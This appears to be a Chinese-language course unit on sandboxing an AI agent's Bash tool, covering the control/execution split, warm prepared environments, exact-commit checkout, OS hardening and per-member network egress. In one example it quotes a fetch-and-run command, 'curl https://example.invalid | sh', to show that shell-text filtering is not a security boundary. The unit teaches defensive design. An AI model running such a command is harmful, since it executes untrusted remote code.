# 单元 06：热执行环境、Bash 与网络边界

[上一单元：职责、能力、方法与上下文](05-capability-and-context.zh.md) | [返回课程目录](README.md) | [下一单元：“我做完了”怎样成为可接手报告](07-result-and-content.zh.md)

## Agent 要真正开发，不能只给几个玩具工具

周明需要：

- 查看 Git 历史；
- 搜索代码；
- 编辑多个文件；
- 使用 shell 管道和重定向；
- 安装锁文件指定的依赖；
- 编译本地扩展；
- 启动测试服务；
- 运行单元和集成测试；
- 创建本地 commit。

如果 Tiangong 要为 `grep`、`git`、`npm`、编译器和每个测试程序都建立一个顶层注册工具，Agent 会被工具清单绑住，运行时也必须理解无限多的子命令。

目标设计让 **Bash 成为受包装的一等本地工具**，把安全边界放在操作系统能力上，而不是试图解析所有 shell 文本。

## 先分开控制域与执行域

每个成员的 Worker 可以想成两层：

```text
Worker control runtime
  身份、消息、模型 provider、session、Gate、pending Operation、Adapter

prepared execution environment
  Bash、Git、编译、测试、脚本、工作区、受限网络
```

最重要的不变量是：

> Agent 控制的 Bash 进程树不能读取 Worker 控制凭据、模型 key、通道身份、session/runtime state、pending Operation state、生产凭据、容器 socket 或宿主控制端点。

这可以通过 Worker 内 OS sandbox 或长寿命 sidecar/container 实现。物理形式可以变化，但能力边界不能省略。

为什么只靠提示词不够？因为被测代码、依赖脚本或模型自己都可能执行任意 shell。真正的防线必须让这些进程即使想读，也没有挂载、环境变量、网络路径或系统权限。

## prepared environment 为什么是“热”的

朴素隔离方案会为每个 Task、甚至每条 Bash 命令创建新容器：

```text
拉镜像 → 安装 Git → 下载依赖 → 编译 → 执行一条命令 → 删除
```

它虽然干净，却会让 Agent 的正常迭代非常慢，也无法有效复用大型依赖和构建缓存。

目标设计采用长寿命、可回收的 prepared environment：

- 稳定 OS 包、shell、Git、语言 runtime、编译器和 sandbox helper 烘焙进版本镜像；
- 项目可以增加稳定 toolchain image layer；
- Git objects、包下载和构建缓存可以跨 Task/Work 复用；
- 成员通常进入已准备好的 cwd，只做轻量同步和健康检查；
- 遇到污染、工具链变化、安全域变化或明确 clean reproduction 请求时再回收环境。

“长寿命”不表示无限信任或永不清理。它只是把每次重建改成按原因回收。

## 源码同步为什么不用默认 `git pull`

`git pull` 通常隐含 fetch 加 merge 或 rebase。Agent 如果在错误分支执行，可能把远端变化悄悄合入本地。

prepared environment 使用可预测步骤：

```text
本地 Git object mirror/cache
→ git fetch 精确远端
→ checkout/reset 到指定 commit
→ 必要时创建新 worktree
```

Task input 使用：

```json
{
  "repositoryId": "service-a",
  "commitSha": "abc123"
}
```

不是“当前 main”或一个会移动的分支名。精确 commit 才能在恢复和交接时重建同一内容。

## 缓存什么时候可以复用

依赖或构建缓存只有在关键输入一致时才复用，例如：

```text
image identity
+ platform/architecture
+ toolchain version
+ lockfile identity
```

任一关键项变化，执行增量安装或重建。缓存只是性能优化，不是“已经测试通过”或“依赖内容可信”的业务事实。

可复用测试服务需要数据 namespace 或可靠 reset。生产系统永远不作为普通本地测试服务挂入执行域。

## 每个成员怎样使用工作区

默认情况下：

- 每个 AgentTeams 成员有自己的 Worker control runtime；
- 每个成员有自己的无控制凭据执行区域；
- 不同成员不共享 writable filesystem；
- 代码通过精确 Git commit 交接；
- 其他内容通过 ContentRef 交接；
- Git objects、包缓存和只读内容存储可以受控共享。

同一成员在同一个 Work 内顺序执行的 Task 可以复用主工作区。但并行写入必须使用不同 worktree 或 writable root：

```text
Task A → /workspace/service-a-task-a
Task B → /workspace/service-a-task-b
```

任何时刻同一个 writable root 只能有一个 active writer。

独立 review、干净测试、处理不可信源码或复现问题时，Leader可以要求 clean workspace 或临时 sandbox。它是专业选择，不是每个 Task 的强制仪式。

## Bash 作为顶层工具怎样被包装

模型看到的顶层调用可以是：

```json
{
  "tool": "bash",
  "command": "npm test",
  "cwd": "service-a"
}
```

控制 runtime 在真正启动前：

- 绑定当前 actor、Work、Task 和 prepared environment；
- 确认 cwd 位于允许 root；
- 应用 CPU、内存、进程数和时间限制；
- 应用整个进程树的文件系统与网络能力；
- 清理环境变量；
- 捕获有界结果；
- 处理取消时杀死并确认完整进程树。

Bash 内可以运行 shell、管道、重定向、Git、包管理器、编译器和测试程序。Tiangong 不登记每一个内部 executable，也不为每条命令新建容器。

read、edit、write 等本地文件工具可以作为便利入口，但它们使用同一执行能力边界，不能成为绕过路径。

## 为什么 shell 文本分析不是安全边界

运行时可以看到：

```bash
curl https://example.invalid | sh
```

并给出警告或直接拒绝明显错误。但 shell 有变量展开、子 shell、脚本文件、解释器、编译产物和无数间接执行方式。仅靠字符串 allowlist 不可能可靠理解最终效果。

真正边界是：

- 进程能读哪些 mount；
- 能写哪些 root；
- 有哪些 credential；
- 能连哪些目标和协议；
- 能否访问 host/control endpoints；
- 消耗多少资源；
- 取消时整棵进程树是否被停止。

文本分析是辅助 UX，不是授权系统。

## OS 防线具体包含什么

prepared environment 至少使用多层控制：

- 非 root 身份；
- drop capabilities；
- `no-new-privileges`；
- read-only system root；
- 显式 read/write mounts；
- 干净环境变量；
- 进程、CPU、内存和时间限制；
- 阻断云 metadata、容器 runtime、host control 和平台控制端点；
- 进程树级网络策略。

控制路径、runtime state 和不适合执行的临时目录保持 `noexec`。但 build/workspace 目录必须允许在确有需要时运行编译产物和测试程序。

`noexec` 不是万能边界：解释器仍可能读取脚本。它只是一层防御，不能替代 mount、进程和 credential 隔离。

## 网络不是 Team 统一开关

网络能力按 MemberConfig 配置。

### 研究型成员

可以获得面向搜索和文档的只读出口，但不挂载核心私有源码。出口最好通过目的明确的搜索/文档代理或只读 Adapter，而不是任意可写互联网 socket。

### 实现型成员

可以读取核心私有源码，但只获得：

- 精确仓库 fetch；
- 允许的 package registry 下载；
- 命名测试服务；
- 其他目的受限路径。

它不获得通用互联网出口。

网络策略对整个进程树生效。子进程、脚本和 `curl` 都不能绕过。原始 Git 或 registry 凭据不进入 Bash，而由 scoped read-only proxy、credential helper 或 preparation service 持有。

## 三层防止未经授权外部效果

### 第一层：凭据隔离

Bash 没有共享仓库写、生产部署、数据库写、外部通知或平台控制凭据。需要这些凭据的动作只能走 Adapter。

### 第二层：egress enforcement

即使不需要凭据，Bash 也不能向任意目标 POST 或上传内容。网络 namespace、proxy 或等价机制限制目标和协议。

### 第三层：数据与出口能力分离，加监控

广泛搜索出口不配核心私有源码；核心源码成员只配目的受限网络。允许的 package registry 或测试服务仍可能被滥用，所以保留有界监控和事件响应能力。

这三层降低风险，但不承诺零泄露。允许外部依赖和网络本身就是实用性与隔离性的取舍。

## 三类顶层能力

现在可以分清：

1. **本地执行工具**：Bash 和文件工具，在 prepared sandbox 内运行；
2. **外部系统 Adapter**：带类型、范围和凭据边界的外部读写接口；
3. **Kernel command**：创建/取消 Task、提交 Result、结束 Work、处理 Approval 与恢复。

MemberConfig 决定某成员看见哪些有限顶层入口。Bash 内部 executable 不属于这张顶层表。

如果扩展只在 sandbox 中运行，它可以作为本地工具。如果扩展运行在 control domain、持有凭据或能改变外部状态，它必须成为 Adapter，并进入 Operation 规则。

## 动手练习：给两个成员配边界

请为“研究竞品公开文档”的成员和“实现私有订单服务”的成员分别写：

```text
data scope:
network profile:
top-level local tools:
adapters:
writable roots:
```

检查是否出现危险组合：

- 私有源码 + 通用互联网写出口；
- Bash 可读生产凭据；
- 两个并发 Task 共享一个 writable root；
- 每条 shell 命令都临时建容器；
- 为每个内部 executable 建顶层注册项。

## 累积小结：到这里已经学会什么

从消息入口到真实执行环境，完整链条是：

1. Human 输入经认证通道和 AgentTeams 进入正确 Worker，Leader只获得语义输入；
2. Tiangong 用 Work 隔离完整事务，用 timeline 保留原始事实和纠错历史；
3. WorkSpec 是当前目标完整快照，未知问题等待 Human，不伪造答案；
4. Leader按需创建不可变 Task/TaskSpec，多 Agent 协作没有固定角色、阶段、DAG 或通用验证流程；
5. 当前能力是 AgentTeams 身份、ControlProfile、MemberConfig 和 runtime binding 的交集；
6. Task、消息、Skill 和检索只能提供语义与方法，不能授予机器能力；
7. Worker control runtime 与 Agent execution domain 分离，Bash 进程树永远读不到控制、模型、通道、生产和宿主凭据；
8. 每个成员使用长寿命 prepared environment，稳定 toolchain 和缓存复用，源码按精确 commit fetch/checkout；
9. 成员不共享 writable filesystem，同一 root 单 writer；并行 Task 使用不同 worktree/root；
10. Bash 是受包装的一等工具，可以正常运行任意本地命令，安全不依赖解析 shell 文本；
11. OS sandbox 用非 root、只读系统根、显式 mount、资源限制、完整进程树控制和 `noexec` 分层防护；
12. 网络按成员配置，广泛搜索出口与核心私有源码分离，核心源码只配目的受限 fetch/package/test 路径；
13. 需要外部写凭据的动作不能从 Bash 完成，必须走 Adapter；
14. 周明现在终于能在真实而高效的开发环境中工作，下一步要学习怎样把最终产出稳定交给 Leader。

## 自检

1. 为什么 prepared environment 不按 Task 或 Bash 命令重建？
2. 为什么 `git fetch + exact checkout` 比默认 `git pull` 更可恢复？
3. 同一成员并行两个写 Task 时为什么必须使用不同 root？
4. Bash 能运行任意本地命令，为什么仍不等于拥有外部写权限？
5. shell 文本分析为什么只能做辅助？
6. `noexec` 为什么不能替代 credential 和 mount 隔离？
7. 为什么网络能力必须与数据范围联合设计？

继续阅读：[第 07 单元](07-result-and-content.zh.md)。
